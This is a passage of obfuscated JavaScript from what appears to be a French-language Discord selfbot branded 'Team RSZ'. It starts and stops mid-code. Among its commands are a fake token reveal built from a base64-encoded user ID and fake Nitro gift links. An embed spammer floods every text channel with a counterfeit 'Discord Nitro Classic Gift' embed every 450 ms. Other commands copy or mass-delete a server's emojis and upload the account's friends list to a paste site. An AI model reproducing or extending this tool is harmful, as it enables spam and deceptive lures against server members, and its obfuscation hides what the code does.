Discord[(_0x8a5b4f(0x2e8))]();_0x439a18[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x4ea)]('**'+client[_0x8a5b4f(0x377)][_0x8a5b4f(0x587)]+_0x8a5b4f(0x652)+_0x1f6d08[_0x8a5b4f(0x587)]+_0x8a5b4f(0x278))[_0x8a5b4f(0x279)]()[_0x8a5b4f(0x248)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')['setImage'](hugh[Math[_0x8a5b4f(0x49c)](Math['random']()*hugh['length'])]),_0x35b0b3[_0x8a5b4f(0x26f)](_0x439a18)[_0x8a5b4f(0x4d5)](_0x315a61=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x3f2)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x30a))){let _0x259829=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);_0x35b0b3[_0x8a5b4f(0x26f)]('Changement\x20du\x20nom\x20du\x20serveur\x20pour:\x20'+_0x259829),_0x35b0b3['guild']['setName'](_0x259829),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x509)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x27f))){if(!_0x1f6d08){_0x35b0b3['edit'](_0x8a5b4f(0x650));return;}let _0x47582c=['HircHg',_0x8a5b4f(0x4a4),_0x8a5b4f(0x4ad),_0x8a5b4f(0x599),_0x8a5b4f(0x365)],_0x4c7876=[_0x8a5b4f(0x292),_0x8a5b4f(0x1ee),_0x8a5b4f(0x4b2),_0x8a5b4f(0x36e)];var _0x4680a7=_0x1f6d08['id'],_0x279fd5=utf8[_0x8a5b4f(0x440)](_0x4680a7),_0x5b6a1d=base64[_0x8a5b4f(0x440)](_0x279fd5);let _0x15236f=new Discord['RichEmbed']()['setColor'](''+color)[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3))['setTitle'](_0x8a5b4f(0x538)+_0x1f6d08['username'])[_0x8a5b4f(0x6e4)](_0x5b6a1d+'.'+_0x47582c[Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*_0x47582c[_0x8a5b4f(0x3f6)])]+'.'+_0x4c7876[Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*_0x4c7876[_0x8a5b4f(0x3f6)])]);setTimeout(()=>{const _0x1925a2=_0x8a5b4f;_0x35b0b3[_0x1925a2(0x26f)](_0x1925a2(0x5f4));},0x3e8),setTimeout(()=>{const _0x4e7504=_0x8a5b4f;_0x35b0b3[_0x4e7504(0x26f)](_0x4e7504(0x3f3));},0x5dc),setTimeout(()=>{_0x35b0b3['edit']('▓▓▓▓░░░░░░\x2040%');},0x7d0),setTimeout(()=>{const _0x198d8f=_0x8a5b4f;_0x35b0b3[_0x198d8f(0x26f)]('▓▓▓▓▓▓░░░░\x2060%');},0x9c4),setTimeout(()=>{const _0x4f8b1b=_0x8a5b4f;_0x35b0b3[_0x4f8b1b(0x26f)](_0x4f8b1b(0x200));},0xbb8),setTimeout(()=>{const _0x425b1d=_0x8a5b4f;_0x35b0b3[_0x425b1d(0x26f)](_0x425b1d(0x42d));},0xdac),setTimeout(()=>{const _0x2a1b40=_0x8a5b4f;_0x35b0b3[_0x2a1b40(0x26f)](_0x15236f)[_0x2a1b40(0x4d5)](_0xf96f23=>console['log']('[',_0x2a1b40(0x391)[_0x2a1b40(0x5fb)],']',_0x2a1b40(0x41a)[_0x2a1b40(0x55b)]));},0xfa0),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x66b)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+'encode')){var _0x2b675b=_0x106d51['join']('\x20')||_0x8a5b4f(0x4f3);;var _0x279fd5=utf8[_0x8a5b4f(0x440)](_0x2b675b),_0x5b6a1d=base64['encode'](_0x279fd5);let _0x47894a=new Discord[(_0x8a5b4f(0x2e8))]()['setColor'](''+color)[_0x8a5b4f(0x4ea)](_0x8a5b4f(0x38e))[_0x8a5b4f(0x6e4)](_0x5b6a1d);_0x35b0b3[_0x8a5b4f(0x26f)](_0x47894a)[_0x8a5b4f(0x4d5)](_0x2b0d2d=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x4ed)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x263))){let _0x5b3659=['5%',_0x8a5b4f(0x60d),_0x8a5b4f(0x2fc),'20%',_0x8a5b4f(0x50f),_0x8a5b4f(0x1cf),_0x8a5b4f(0x3bc),_0x8a5b4f(0x548),_0x8a5b4f(0x56a),_0x8a5b4f(0x62b),'55','60%',_0x8a5b4f(0x483),_0x8a5b4f(0x3f9),_0x8a5b4f(0x36c),'80%',_0x8a5b4f(0x23c),_0x8a5b4f(0x2ee),_0x8a5b4f(0x384),'100%'],_0x1de89c=Math['floor'](Math[_0x8a5b4f(0x4ca)]()*_0x5b3659[_0x8a5b4f(0x3f6)]),_0x5dce5b=_0x106d51[_0x8a5b4f(0x65a)](0x0)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);;let _0x4b575a=new Discord[(_0x8a5b4f(0x2e8))]()['setAuthor'](_0x35b0b3[_0x8a5b4f(0x42b)]['tag'])['setColor'](_0x8a5b4f(0x2e7))[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3))['setThumbnail'](''+_0x35b0b3['author'][_0x8a5b4f(0x355)])[_0x8a5b4f(0x463)]('calcul\x20de\x20relation\x20plausible\x20❤',_0x5dce5b)[_0x8a5b4f(0x463)](_0x8a5b4f(0x40e),_0x5b3659[_0x1de89c]);_0x35b0b3['edit'](_0x4b575a)[_0x8a5b4f(0x4d5)](_0x1d0d9d=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console['log']('╟\x20Commande\x20lovecalc\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x68e))){const _0x4b72da=_0x35b0b3[_0x8a5b4f(0x4c7)]['split']('\x20')['slice'](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);let _0x554fd7=rpcGenerator[_0x8a5b4f(0x1f0)](client)[_0x8a5b4f(0x231)]('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')[_0x8a5b4f(0x413)](_0x8a5b4f(0x55a))[_0x8a5b4f(0x685)](_0x4b72da)[_0x8a5b4f(0x204)](_0x8a5b4f(0x4f3))[_0x8a5b4f(0x458)](Date[_0x8a5b4f(0x51b)]())[_0x8a5b4f(0x2db)](Date[_0x8a5b4f(0x51b)]()+0x5265c00);client['user'][_0x8a5b4f(0x695)](_0x554fd7[_0x8a5b4f(0x694)]())['then'](_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x450)+_0x4b72da+_0x8a5b4f(0x1f5)))[_0x8a5b4f(0x4d5)](console['error']),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x31f)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x2a6))&&(clearInterval(),client[_0x8a5b4f(0x377)]['setActivity'](null,{}),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x575))['catch'](_0x14f258=>console['log']('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)]('Commande\x20reset\x20effectué'[_0x8a5b4f(0x647)]));if(_0x35b0b3['content']===prefix+'nitro'){const _0x59f648=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x36f)](_0x8a5b4f(0x44b))[_0x8a5b4f(0x463)](_0x8a5b4f(0x6ce),_0x8a5b4f(0x646)+'/discord.gift/'+nitrocode(0x10,_0x8a5b4f(0x59f)));_0x35b0b3[_0x8a5b4f(0x26f)](_0x59f648)[_0x8a5b4f(0x4d5)](_0x3d8adb=>console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console['log'](_0x8a5b4f(0x4c9)),console['log'](_0x8a5b4f(0x59d));}_0x5e9f52[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x374))&&(_0x5e9f52[_0x8a5b4f(0x246)](),setTimeout(()=>{const _0x24afeb=_0x8a5b4f;client[_0x24afeb(0x29a)]()[_0x24afeb(0x4d5)](_0x33c918=>console[_0x24afeb(0x32b)]('[','ERROR'[_0x24afeb(0x5fb)],']',_0x24afeb(0x41a)[_0x24afeb(0x55b)]));},0x5dc),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x23a)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢'));if(_0x5e9f52['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x298))){let _0x1dcb9c=_0x106d51['splice'](0x1)['join']('\x20');!_0x1dcb9c&&_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x435));function _0x330e6b(_0x542740){const _0x56db3e=_0x8a5b4f;return _0x542740[_0x56db3e(0x534)]('')[_0x56db3e(0x298)]()['join']('');}let _0x38aa85=_0x330e6b(_0x1dcb9c);_0x106d51[0x0]===_0x38aa85&&(_0x38aa85=''+_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')),_0x5e9f52[_0x8a5b4f(0x26f)](''+_0x38aa85)[_0x8a5b4f(0x4d5)](console[_0x8a5b4f(0x55f)]),console['log'](_0x8a5b4f(0x1f2)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x5e9f52[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x5ac))){let _0x48db92=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x6e4)](_0x8a5b4f(0x467)+Discord['version']+'**')['setFooter']('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉');_0x5e9f52['edit'](_0x48db92)[_0x8a5b4f(0x4d5)](_0x2b40b3=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)['red'],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x5ec)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');}_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x297)&&(_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x425))[_0x8a5b4f(0x1d9)](client[_0x8a5b4f(0x29a)]())[_0x8a5b4f(0x1d9)](()=>client[_0x8a5b4f(0x59b)](token)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x383)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));_0x35b0b3['content']===prefix+_0x8a5b4f(0x41f)&&(_0x35b0b3[_0x8a5b4f(0x26f)]('**Stop\x20Spam\x20effectué**')[_0x8a5b4f(0x1d9)](client[_0x8a5b4f(0x29a)]())[_0x8a5b4f(0x1d9)](()=>client['login'](token)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x5cb)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x4f0)||prefix+'ri')){let _0x4779b8=_0x35b0b3['guild'],_0x1d672c=_0x35b0b3[_0x8a5b4f(0x610)][_0x8a5b4f(0x5b3)][_0x8a5b4f(0x45d)]();if(!_0x4779b8)return _0x5e9f52[_0x8a5b4f(0x26f)](':x:\x20**Commande\x20uniquement\x20utilisable\x20sur\x20un\x20serveur**');if(!_0x1d672c)return _0x35b0b3[_0x8a5b4f(0x246)]()[_0x8a5b4f(0x1d9)](console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x66d)[_0x8a5b4f(0x55b)]));const _0x343591={'false':'Non','true':_0x8a5b4f(0x522)};let _0x5b32e9=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x6e4)]('<@&'+_0x1d672c['id']+'>')[_0x8a5b4f(0x463)](_0x8a5b4f(0x265),_0x1d672c['id'])[_0x8a5b4f(0x463)](_0x8a5b4f(0x446),_0x1d672c[_0x8a5b4f(0x5f6)])[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3))[_0x8a5b4f(0x463)](_0x8a5b4f(0x67b),_0x1d672c[_0x8a5b4f(0x2e0)][_0x8a5b4f(0x3ed)])[_0x8a5b4f(0x463)]('position:',_0x1d672c[_0x8a5b4f(0x262)])[_0x8a5b4f(0x463)](_0x8a5b4f(0x4dc),_0x343591[_0x1d672c['mentionable']]);if(!_0x35b0b3['member'][_0x8a5b4f(0x554)](_0x8a5b4f(0x577)))return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x3a6)+_0x1d672c['id']+_0x8a5b4f(0x6a9)+_0x1d672c['id']+_0x8a5b4f(0x330)+_0x1d672c[_0x8a5b4f(0x5f6)]+_0x8a5b4f(0x496)+_0x1d672c['members'][_0x8a5b4f(0x3ed)]+_0x8a5b4f(0x51f)+_0x1d672c[_0x8a5b4f(0x262)]+_0x8a5b4f(0x58a)+_0x343591[_0x1d672c[_0x8a5b4f(0x607)]]);console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20role\x20info\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x5b32e9)['catch'](_0x9b4422=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x20b))){if(_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x661)]==='dm'){_0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Commande\x20pas\x20executable\x20en\x20mp**');return;}let _0x29ede4=_0x106d51[_0x8a5b4f(0x217)](0x2)[_0x8a5b4f(0x565)]('\x20'),_0x181efa=Discord['Util']['parseEmoji'](_0x29ede4);if(!_0x106d51){_0x35b0b3['edit'](_0x8a5b4f(0x4ee));return;}if(!_0x181efa){_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x5a9)+prefix+_0x8a5b4f(0x644));return;}if(!_0x35b0b3[_0x8a5b4f(0x53b)][_0x8a5b4f(0x554)](_0x8a5b4f(0x6d2))){_0x35b0b3['edit'](_0x8a5b4f(0x25d));return;}if(_0x181efa['id']){const _0x18967e=_0x8a5b4f(0x544)+_0x181efa['id']+'.'+(_0x181efa[_0x8a5b4f(0x4b5)]?_0x8a5b4f(0x3e2):_0x8a5b4f(0x42f));let _0x451496=_0x35b0b3[_0x8a5b4f(0x4c7)]['split']('\x20')[_0x8a5b4f(0x217)](0x3)||_0x181efa[_0x8a5b4f(0x47a)];_0x35b0b3[_0x8a5b4f(0x5e1)]['createEmoji'](''+_0x18967e,''+_0x451496),_0x35b0b3[_0x8a5b4f(0x26f)](':white_check_mark:\x20**Emote\x20ajoutée\x20au\x20serveur.**'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x619)[_0x8a5b4f(0x647)]);}else _0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Veuillez\x20choisir\x20une\x20emote\x20valide!**');}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'emote'){if(_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x661)]==='dm'){_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x4a3));return;}let _0x54327b='',_0x34820b='',_0x2b055b=0x0,_0x55acf3=0x0,_0x56c419=0x0;function _0x3740b7(_0x26dbc2){const _0x123705=_0x8a5b4f;return client[_0x123705(0x2d1)][_0x123705(0x283)](_0x26dbc2)[_0x123705(0x6db)]();}_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2d1)]['forEach'](_0x2e1f19=>{_0x56c419++,_0x2e1f19['animated']?(_0x55acf3++,_0x34820b+=_0x3740b7(_0x2e1f19['id'])):(_0x2b055b++,_0x54327b+=_0x3740b7(_0x2e1f19['id']));});let _0x5b2f60=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x4ea)]('Emojis\x20dans:\x20**'+_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x47a)]+'**')['setFooter'](_0x8a5b4f(0x4f3))[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x463)](_0x8a5b4f(0x475)+_0x55acf3+']',_0x34820b||_0x8a5b4f(0x337))['addField'](_0x8a5b4f(0x6af)+_0x2b055b+']',_0x54327b||_0x8a5b4f(0x337))[_0x8a5b4f(0x463)](_0x8a5b4f(0x632),_0x56c419||'None');_0x35b0b3['edit'](_0x5b2f60),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20emote\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x5c7))){if(_0x35b0b3['channel'][_0x8a5b4f(0x661)]==='dm'){_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x4a3));return;}if(!_0x35b0b3[_0x8a5b4f(0x53b)][_0x8a5b4f(0x554)](_0x8a5b4f(0x6d2)))return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x25d));const _0x2a2803=_0x106d51[_0x8a5b4f(0x217)](0x2)[_0x8a5b4f(0x565)]('\x20');if(!_0x2a2803)return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x4ee));let _0x3168d5=Discord[_0x8a5b4f(0x5c9)][_0x8a5b4f(0x46e)](_0x2a2803);if(!_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2d1)][_0x8a5b4f(0x1e7)](_0x42a475=>{const _0x3acf2f=_0x8a5b4f;if(!_0x42a475['id']===_0x3168d5['id'])return _0x35b0b3['channel'][_0x3acf2f(0x678)](':x:\x20**Cette\x20emote\x20n\x27est\x20pas\x20sur\x20le\x20serveur**.');}))return _0x35b0b3['edit'](':white_check_mark:\x20**Emote\x20correctement\x20supprimée\x20du\x20serveur.**');if(_0x3168d5['id']){const _0x483bf6=_0x8a5b4f(0x544)+_0x3168d5['id']+'.'+(_0x3168d5[_0x8a5b4f(0x4b5)]?_0x8a5b4f(0x3e2):_0x8a5b4f(0x42f));_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2d1)][_0x8a5b4f(0x283)](_0x3168d5['id'])[_0x8a5b4f(0x246)]();}else{let _0x322dc6=parse(_0x2a2803,{'assetType':'png'});if(!_0x322dc6[0x0])return _0x35b0b3['edit'](_0x8a5b4f(0x267));_0x35b0b3['edit'](_0x8a5b4f(0x305));};console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x28b)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+'embed_spammer')){let _0x35ed0b=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x5b9)]('©\x20Discord\x20Nitro\x20Classic\x20Gift')[_0x8a5b4f(0x39b)]('#0027ff')[_0x8a5b4f(0x36f)]('https://emoji.gg/assets/emoji/6234_nitro_booster_s.gif')[_0x8a5b4f(0x6ae)](_0x8a5b4f(0x486))[_0x8a5b4f(0x463)](_0x8a5b4f(0x2a8),_0x8a5b4f(0x371))[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3));_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e6)][_0x8a5b4f(0x508)](_0x30d8ec=>_0x30d8ec['type']===_0x8a5b4f(0x261))['forEach'](_0xc5b8fa=>{setInterval(()=>{const _0x406230=_0x5e0d;_0xc5b8fa[_0x406230(0x678)](_0x35ed0b);},0x1c2);}),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20spam\x20embed'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));return;}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x542))){_0x35b0b3[_0x8a5b4f(0x246)]();let _0x4e3b04=_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x3e0)];console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x284)+_0x35b0b3['guild'][_0x8a5b4f(0x47a)]+':\x20'+_0x4e3b04+'\x20\x22'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3['content']['startsWith'](prefix+_0x8a5b4f(0x2ca))){if(_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x661)]==='dm'){_0x35b0b3['edit'](_0x8a5b4f(0x4a3));return;}let _0xbb475c=_0x106d51[_0x8a5b4f(0x217)](0x2)['join']('\x20'),_0x518d70=client['guilds'][_0x8a5b4f(0x283)](_0xbb475c);if(!_0x518d70){_0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Aucun\x20serveur\x20trouvable\x20avec\x20l\x27id**\x20\x22'+_0xbb475c+'\x22');return;}if(!_0x35b0b3[_0x8a5b4f(0x53b)][_0x8a5b4f(0x554)]('MANAGE_EMOJIS'))return _0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Vous\x20n\x27avez\x20pas\x20les\x20permissions\x20\x22Gérer\x20les\x20emojis\x22\x20sur\x20ce\x20serveur**');_0x518d70['emojis']['size']<0x1&&_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x431));let _0x682818='1';_0x518d70[_0x8a5b4f(0x2d1)][_0x8a5b4f(0x1e7)](_0x306c09=>{setTimeout(()=>{const _0x3e9cda=_0x5e0d;let _0x5f31ff=_0x306c09['name'];const _0x8beaa2=_0x3e9cda(0x544)+_0x306c09['id']+'.'+(_0x306c09[_0x3e9cda(0x4b5)]?_0x3e9cda(0x3e2):_0x3e9cda(0x42f));_0x35b0b3[_0x3e9cda(0x5e1)][_0x3e9cda(0x667)](''+_0x8beaa2,''+_0x5f31ff)[_0x3e9cda(0x4d5)](_0x56ee54=>_0x682818+'1');},0x3e8);}),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x62e)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)),_0x35b0b3['edit'](_0x8a5b4f(0x3cf)+_0x518d70['name']+'\x22');}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x280)){if(_0x35b0b3['channel'][_0x8a5b4f(0x661)]==='dm'){_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x4a3));return;}if(_0x35b0b3['guild'][_0x8a5b4f(0x2d1)][_0x8a5b4f(0x3ed)]<0x1){_0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Il\x20n\x27\x20y\x20a\x20aucun\x20emote\x20a\x20supprimer.**');return;}_0x35b0b3['guild'][_0x8a5b4f(0x2d1)][_0x8a5b4f(0x1e7)](_0x3e66e8=>{const _0x54aac7=_0x8a5b4f;_0x35b0b3[_0x54aac7(0x5e1)]['emojis'][_0x54aac7(0x283)](_0x3e66e8['id'])[_0x54aac7(0x246)]();});};if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x46c))){let _0x1540a9=_0x35b0b3[_0x8a5b4f(0x610)]['users'][_0x8a5b4f(0x45d)](),_0x7910e2=_0x1540a9[_0x8a5b4f(0x355)];if(!_0x1540a9){_0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Veuillez\x20mentionner\x20un\x20utilisateur\x20valide!**');return;};if(!_0x7910e2){_0x35b0b3[_0x8a5b4f(0x456)](_0x8a5b4f(0x24f));return;};client[_0x8a5b4f(0x377)][_0x8a5b4f(0x35b)](_0x7910e2),console['log'](_0x8a5b4f(0x304)),console['log']('╟─────────────────────────────────╢'),_0x35b0b3['edit'](_0x8a5b4f(0x3a8)+_0x1540a9['username']+'\x22');};try{let _0x53544c=client[_0x8a5b4f(0x2d1)][_0x8a5b4f(0x283)](_0x8a5b4f(0x392))||'ℹ️',_0x1725f9=client['emojis'][_0x8a5b4f(0x283)](_0x8a5b4f(0x4d7))||'⌛',_0xe4f7da=client[_0x8a5b4f(0x2d1)]['get'](_0x8a5b4f(0x434))||'✅',_0x2f429b=client[_0x8a5b4f(0x2d1)][_0x8a5b4f(0x283)]('655704809483141141')||'❌',_0x4b9d4d=client[_0x8a5b4f(0x2d1)][_0x8a5b4f(0x283)](_0x8a5b4f(0x6b2))||'⚠️';if(_0x35b0b3['content']===prefix+_0x8a5b4f(0x581)){var _0x2e4cc2=client[_0x8a5b4f(0x377)][_0x8a5b4f(0x5af)][_0x8a5b4f(0x3ed)];const _0x52aa4e=client[_0x8a5b4f(0x377)][_0x8a5b4f(0x5af)][_0x8a5b4f(0x634)]();let _0x10c3f2=('backup\x20friends\x20créé\x20avec\x20succès\x20'+_0x52aa4e[_0x8a5b4f(0x3f6)][_0x8a5b4f(0x6db)]()[_0x8a5b4f(0x566)]+_0x8a5b4f(0x277))['green'];console[_0x8a5b4f(0x32b)](_0x10c3f2),hastebins(_0x52aa4e+'\x0a')[_0x8a5b4f(0x1d9)](_0x17d5a9=>{const _0x53dd8b=_0x8a5b4f;var _0x4a12b=new Discord['RichEmbed']()['setTitle'](_0x53dd8b(0x6bd))[_0x53dd8b(0x463)](_0x53dd8b(0x46f),_0x17d5a9)[_0x53dd8b(0x39b)](color)[_0x53dd8b(0x279)]()[_0x53dd8b(0x6e4)](_0x53dd8b(0x600));_0x35b0b3['edit'](_0x4a12b)[_0x53dd8b(0x4d5)](_0x16a4b0=>console['log']('[',_0x53dd8b(0x391)[_0x53dd8b(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x53dd8b(0x55b)])),console[_0x53dd8b(0x32b)](_0x53dd8b(0x684)),console[_0x53dd8b(0x32b)](_0x53dd8b(0x59d));});}function _0x2b96a7(_0x2c8cee){const _0x2d45c9=_0x8a5b4f;var _0x31ed21='',_0x572336=_0x2d45c9(0x361),_0x3a6d45=_0x572336[_0x2d45c9(0x3f6)];for(var _0x35aa04=0x0;_0x35aa04<_0x2c8cee;_0x35aa04++){_0x31ed21+=_0x572336[_0x2d45c9(0x2f2)](Math[_0x2d45c9(0x49c)](Math[_0x2d45c9(0x4ca)]()*_0x3a6d45));}return _0x31ed21;}function _0x77a744(){const _0x57c8c1=_0x8a5b4f;fs[_0x57c8c1(0x3c0)]('./Data/backups.json',JSON[_0x57c8c1(0x3cc)](backups),_0x3a9c1f=>{const _0x1520a4=_0x57c8c1;if(_0x3a9c1f)console[_0x1520a4(0x55f)](_0x3a9c1f);});}}catch(_0x28bd31){return;}});function saving(){const _0x383067=_0x4ab3e5;fs['writeFile']('./Data/afk.json',JSON[_0x383067(0x3cc)](afk),_0x367d56=>{const _0x611480=_0x383067;if(_0x367d56)console[_0x611480(0x55f)](_0x367d56);});}function liste(){const _0x2db203=_0x4ab3e5;fs[_0x2db203(0x3c0)](_0x2db203(0x3f7),JSON[_0x2db203(0x3cc)](lbackup),_0x27c948=>{const _0x3163c6=_0x2db203;if(_0x27c948)console[_0x3163c6(0x55f)](_0x27c948);});}function kicker(){const _0x2c0c0f=_0x4ab3e5;fs[_0x2c0c0f(0x3c0)](_0x2c0c0f(0x69b),JSON[_0x2c0c0f(0x3cc)](kicked),_0x139271=>{const _0x479b12=_0x2c0c0f;if(_0x139271)console[_0x479b12(0x55f)](_0x139271);});}client['on'](_0x4ab3e5(0x515),_0x17640d=>{const 